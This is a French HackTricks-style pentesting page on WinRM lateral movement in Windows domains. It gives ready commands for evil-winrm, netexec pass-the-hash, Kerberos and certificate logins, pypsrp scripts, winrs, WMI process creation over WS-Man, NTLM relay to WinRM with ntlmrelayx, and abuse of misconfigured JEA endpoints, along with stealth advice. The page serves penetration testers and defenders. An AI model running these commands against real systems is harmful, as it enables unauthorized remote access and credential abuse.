# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM est l’un des moyens de **lateral movement** les plus pratiques dans les environnements Windows, car il fournit un shell distant via **WS-Man/HTTP(S)** sans nécessiter les astuces de création de service SMB. Si la cible expose **5985/5986** et que votre principal est autorisé à utiliser le remoting, vous pouvez souvent passer très rapidement de « identifiants valides » à « shell interactif ».

Pour l’énumération du **protocole/service**, les listeners, l’activation de WinRM, `Invoke-Command` et l’utilisation générique d’un client, consultez :

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Pourquoi les opérateurs apprécient WinRM

- Utilise **HTTP/HTTPS** plutôt que SMB/RPC ; il fonctionne donc souvent lorsque l’exécution de type PsExec est bloquée.
- Avec **Kerberos**, il évite d’envoyer des identifiants réutilisables à la cible.
- Fonctionne bien avec les outils **Windows**, **Linux** et **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- La méthode interactive de PowerShell remoting lance **`wsmprovhost.exe`** sur la cible dans le contexte de l’utilisateur authentifié, ce qui diffère sur le plan opérationnel de l’exécution basée sur un service.

## Modèle d’accès et prérequis

En pratique, la réussite du lateral movement via WinRM dépend de **trois** éléments :

1. La cible dispose d’un **listener WinRM** (`5985`/`5986`) et de règles de pare-feu qui autorisent l’accès.
2. Le compte peut s’**authentifier** auprès du endpoint.
3. Le compte est autorisé à **ouvrir une session remoting**.

Les moyens courants d’obtenir cet accès :

- Être **Administrateur local** sur la cible.
- Appartenir au groupe **Remote Management Users** sur les systèmes récents ou à **WinRMRemoteWMIUsers__** sur les systèmes/composants qui utilisent encore ce groupe.
- Disposer de droits remoting explicitement délégués via des descripteurs de sécurité locaux ou des modifications des ACL PowerShell remoting.

Si vous contrôlez déjà une machine avec des droits d’administration, rappelez-vous que vous pouvez aussi **déléguer l’accès WinRM sans appartenir au groupe des administrateurs** à l’aide des techniques décrites ici :

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pièges d’authentification importants pour le lateral movement

- **Kerberos nécessite un nom d’hôte/FQDN**. Si vous vous connectez par adresse IP, le client utilise généralement **NTLM/Negotiate**.
- Dans un **workgroup** ou dans certains cas limites entre domaines de confiance, NTLM nécessite souvent soit **HTTPS**, soit que la cible soit ajoutée à **TrustedHosts** sur le client.
- Avec des comptes locaux utilisant Negotiate dans un workgroup, les restrictions UAC à distance peuvent empêcher l’accès, sauf si le compte Administrator intégré est utilisé ou si `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting utilise par défaut le **SPN `HTTP/<host>`**. Dans les environnements où `HTTP/<host>` est déjà enregistré pour un autre compte de service, Kerberos WinRM peut échouer avec `0x80090322` ; utilisez un SPN avec le port ou passez à **`WSMAN/<host>`** si ce SPN existe.<sup>[[3]](#references)</sup>

Si vous obtenez des identifiants valides lors d’une campagne de password spraying, les valider via WinRM est souvent le moyen le plus rapide de vérifier s’ils permettent d’obtenir un shell :

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux vers Windows

### NetExec / CrackMapExec pour la validation et l’exécution ponctuelle

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM pour les shells interactifs

`evil-winrm` reste l’option interactive la plus pratique depuis Linux, car il prend en charge les **mots de passe**, les **hashes NT**, les **tickets Kerberos**, les **certificats client**, le transfert de fichiers et le chargement en mémoire de PowerShell/.NET.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Cas particulier Kerberos SPN : `HTTP` vs `WSMAN`

Lorsque le SPN par défaut **`HTTP/<host>`** entraîne des échecs Kerberos, essayez plutôt de demander/d’utiliser un ticket **`WSMAN/<host>`**. Cela peut se produire dans des environnements d’entreprise renforcés ou inhabituels, où **`HTTP/<host>`** est déjà associé à un autre compte de service.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Cela est également utile après un abus de **RBCD / S4U** lorsque vous avez spécifiquement forgé ou demandé un ticket de service **WSMAN** plutôt qu’un ticket générique `HTTP`.

### Authentification par certificat

WinRM prend également en charge **l’authentification par certificat client**, mais le certificat doit être associé à un **compte local** sur la cible. Du point de vue offensif, cela est utile lorsque :

- vous avez volé/exporté un certificat client valide et sa clé privée, déjà associés à WinRM ;
- vous avez abusé de **AD CS / Pass-the-Certificate** pour obtenir un certificat pour un principal, puis basculer vers une autre méthode d’authentification ;
- vous opérez dans des environnements qui évitent délibérément l’accès à distance par mot de passe.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

WinRM par certificat client est beaucoup moins courant que l’authentification par mot de passe/hash/Kerberos, mais lorsqu’il est disponible, il peut offrir une voie de **passwordless lateral movement** qui résiste à la rotation des mots de passe.

### Python / automatisation avec `pypsrp`

Si vous avez besoin d’automatisation plutôt que d’un shell d’opérateur, `pypsrp` permet d’utiliser WinRM/PSRP depuis Python et prend en charge **NTLM**, **l’authentification par certificat**, **Kerberos** et **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Si vous avez besoin d’un contrôle plus fin que celui offert par le wrapper haut niveau `Client`, les API de plus bas niveau `WSMan` + `RunspacePool` sont utiles pour résoudre deux problèmes courants côté opérateur :

- imposer **`WSMAN`** comme service/SPN Kerberos au lieu de l’attente par défaut **`HTTP`** utilisée par de nombreux clients PowerShell ;
- se connecter à un endpoint PSRP **non standard**, comme une configuration de session **JEA** / personnalisée, au lieu de `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Les endpoints PSRP personnalisés et JEA comptent lors des déplacements latéraux

Une authentification WinRM réussie ne signifie **pas** toujours que vous arrivez sur l’endpoint `Microsoft.PowerShell` par défaut, sans restriction. Les environnements matures peuvent exposer des **configurations de session personnalisées** ou des endpoints **JEA** dotés de leurs propres ACL et de leur propre comportement run-as.<sup>[[1]](#references)</sup>

Si vous avez déjà une exécution de code sur un hôte Windows et souhaitez comprendre quelles surfaces de remoting existent, énumérez les endpoints enregistrés :

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Lorsqu’un endpoint utile est disponible, ciblez-le explicitement plutôt que le shell par défaut :

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Implications pratiques en offensive :

- Un endpoint **restreint** peut suffire au lateral movement s’il expose juste les cmdlets/fonctions nécessaires au contrôle des services, à l’accès aux fichiers, à la création de processus ou à l’exécution arbitraire de commandes .NET / externes.
- Un rôle **JEA mal configuré** est particulièrement intéressant s’il expose des commandes dangereuses telles que `Start-Process`, des jokers trop larges, des providers accessibles en écriture ou des fonctions proxy personnalisées qui permettent de contourner les restrictions prévues.
- Les endpoints reposant sur des **comptes virtuels RunAs** ou des **gMSA** modifient le contexte de sécurité effectif des commandes exécutées. En particulier, un endpoint reposant sur une gMSA peut fournir une **identité réseau au deuxième saut**, même lorsqu’une session WinRM normale se heurte au problème classique de délégation.

Pour un endpoint personnalisé restreint, examinez séparément les autorisations effectives sur les commandes et les scripts : une courte liste `Get-Command` ne prouve pas à elle seule qu’un fichier `.ps1` existant ne peut pas être exécuté. Les [capacités de rôle JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) définissent explicitement les chemins de script pouvant être invoqués ; d’autres endpoints personnalisés peuvent appliquer des règles de session différentes. Si un script autorisé utilise un `SecureString` stocké pour créer un identifiant destiné à un autre hôte, un blob créé sans clé explicite utilise [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) et nécessite généralement le contexte de l’utilisateur et de la machine qui l’a protégé pour être déchiffré. Vérifiez l’ACL du script, les autorisations d’invocation, l’identité RunAs et les droits sur les identifiants en aval avant de considérer une source modifiable ou un blob copié comme une voie d’escalade entre hôtes. N’affichez pas la valeur protégée lors d’une énumération passive.

Pour une fonction personnalisée JEA qui accepte un chemin de fichier, examinez ensemble l’ACL de l’endpoint enregistré, la capacité de rôle associée et l’identité RunAs effective. Un appelant peut être soumis à `NoLanguage` tandis que le corps de la fonction s’exécute en mode de langage par défaut du système ; un compte virtuel peut également disposer de droits d’administrateur local. Si la fonction vérifie un répertoire autorisé au moyen d’un préfixe de chaîne brut, puis lit le chemin fourni, les composants `..` peuvent permettre de sortir de ce répertoire. La limite est le chemin résolu sous l’identité de la fonction, et non le mode de langage de l’appelant ni le préfixe apparent. Confirmez la fonction accessible et la validation du chemin final avant de considérer un fichier `.psrc` ou `.pssc` lisible comme une vulnérabilité de lecture de fichiers privilégiée. Consultez les recommandations de Microsoft sur les [capacités de rôle JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) et les [considérations de sécurité](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Mouvement latéral WinRM natif Windows

### `winrs.exe`

`winrs.exe` est intégré à Windows et utile lorsque vous voulez **exécuter des commandes avec WinRM natif** sans ouvrir de session interactive PowerShell Remoting :

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Deux options sont faciles à oublier et importantes en pratique :

- `/noprofile` est souvent nécessaire lorsque le principal distant **n’est pas** administrateur local.
- `/allowdelegate` permet au shell distant d’utiliser vos identifiants auprès d’un **troisième hôte** (par exemple, lorsque la commande a besoin de `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Sur le plan opérationnel, `winrs.exe` entraîne généralement une chaîne de processus distante similaire à :

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Il est utile de s’en souvenir, car cela diffère de l’exécution basée sur un service et des sessions PSRP interactives.

### `winrm.cmd` / WS-Man COM au lieu de PowerShell remoting

Vous pouvez également exécuter des commandes via le **transport WinRM** sans utiliser `Enter-PSSession`, en invoquant des classes WMI via WS-Man. Le transport reste ainsi WinRM, tandis que le mécanisme d’exécution à distance devient **WMI `Win32_Process.Create`** :

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Cette approche est utile lorsque :

- La journalisation PowerShell est étroitement surveillée.
- Vous voulez utiliser le **transport WinRM**, mais pas un workflow classique de PS remoting.
- Vous développez ou utilisez des outils personnalisés autour de l’objet COM **`WSMan.Automation`**.

## NTLM relay vers WinRM (WS-Man)

Lorsque le SMB relay est bloqué par la signature et que le LDAP relay est limité, **WS-Man/WinRM** peut toujours constituer une cible de relay intéressante. Les versions modernes de `ntlmrelayx.py` incluent des serveurs WinRM relay et peuvent relayer vers des cibles **`wsman://`** ou **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Deux remarques pratiques :

- Le relay est surtout utile lorsque la cible accepte **NTLM** et que le principal relayé est autorisé à utiliser WinRM.
- Le code récent d’Impacket gère spécifiquement les requêtes **`WSMANIDENTIFY: unauthenticated`**, afin que les sondes de type `Test-WSMan` ne perturbent pas le déroulement du relay.

Pour les contraintes de multi-hop après avoir obtenu une première session WinRM, consultez :

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Remarques sur l’OPSEC et la détection

- **Interactive PowerShell remoting** crée généralement **`wsmprovhost.exe`** sur la cible.
- **`winrs.exe`** crée couramment **`winrshost.exe`**, puis le processus enfant demandé.
- Les endpoints **JEA** personnalisés peuvent exécuter des actions en tant que comptes virtuels **`WinRM_VA_*`** ou en tant que **gMSA** configuré, ce qui modifie à la fois la télémétrie et le comportement du second saut par rapport à un shell exécuté dans le contexte d’un utilisateur normal.<sup>[[1]](#references)</sup>
- Attendez-vous à de la télémétrie de connexion réseau, à des événements du service WinRM et à la journalisation opérationnelle/de blocs de script PowerShell si vous utilisez PSRP plutôt que `cmd.exe` brut.
- Si vous n’avez besoin que d’exécuter une seule commande, `winrs.exe` ou une exécution WinRM ponctuelle peut être plus discrète qu’une session de remoting interactive de longue durée.
- Si Kerberos est disponible, préférez **FQDN + Kerberos** à IP + NTLM afin de réduire les problèmes de confiance ainsi que les modifications peu pratiques de `TrustedHosts` côté client.

## References

- [1] [Microsoft : considérations de sécurité liées à JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README de pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft : erreur `0x80090322` lors de la connexion de PowerShell à un serveur distant via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
